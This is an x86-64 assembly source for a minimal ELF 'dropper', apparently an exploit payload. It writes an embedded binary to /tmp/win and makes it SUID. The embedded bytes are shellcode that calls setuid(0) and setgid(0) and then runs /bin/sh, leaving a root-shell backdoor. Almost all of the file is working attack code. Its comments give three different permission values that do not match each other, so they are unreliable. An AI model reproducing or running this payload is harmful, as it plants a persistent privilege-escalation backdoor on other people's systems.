; dropper.S - writes root shell to /tmp/win and makes it SUID
;
; Minimal ELF that does:
; fd = open("/tmp/win",  O_WRONLY | O_CREAT | O_TRUNC)
; write(fd, shellcode, shellcodeLen)
; chmod("/tmp/win", 06755);
; close(fd)
; exit(0)
;
; INP=dropper; nasm -f bin -o $INP $INP.S
; hexdump -v -e '16/1 "0x%02x, " "\n"' payloads/dropper
BITS 64

ehdr:                               ; ELF64_Ehdr
    db  0x7F, "ELF", 2, 1, 1, 0
    times 8 db 0
    dw  3
    dw  0x3e
    dd  1
    dq  _start
    dq  phdr - $$
    dq  0
    dd  0
    dw  ehdrsize
    dw  phdrsize
    dw  1
    dw  0
    dw  0
    dw  0

ehdrsize    equ $ - ehdr

phdr:
    dd  1
    dd  5
    dq  0
    dq  $$
    dq  $$
    dq  filesize
    dq  filesize
    dq  0x1000

phdrsize    equ $ - phdr

section .data
win: db "/tmp/win", 0
winLen: equ $-win

sc: db 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,\
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,\
       0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,\
       0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,\
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\
       0x48,0x31,0xff,0xb0,0x69,0x0f,0x05,0x48,\
       0x31,0xff,0xb0,0x6a,0x0f,0x05,0x48,0xbb,\
       0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,\
       0x48,0xf7,0xdb,0x53,0x48,0x89,0xe7,0x56,\
       0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05

scLen: equ $ - sc

section .text
global _start

_start:
    default rel
    mov al, 0x2                 ; sys_open
    lea rdi, [rel win]          ; "/tmp/win"
    mov rsi, 0x241              ; O_WRONLY|O_CREAT|O_TRUNC
    syscall

    mov rdi, rax                ; fd
    lea rsi, [rel sc]           ; buf
    mov rdx, scLen              ; len = 160 (0xa0)
    mov al, 0x1                 ; sys_write
    syscall

    xor rax, rax
    mov al, 0x3                 ; sys_close
    syscall

    lea rdi, [rel win]
    mov rsi, 0xdfd;             ; 06777: rwxrwxrwx + SUID
    mov al, 0x5a                ; sys_chmod
    syscall

    xor rdi, rdi
    mov al, 0x3c                ; sys_exit
    syscall

filesize equ $ - $$
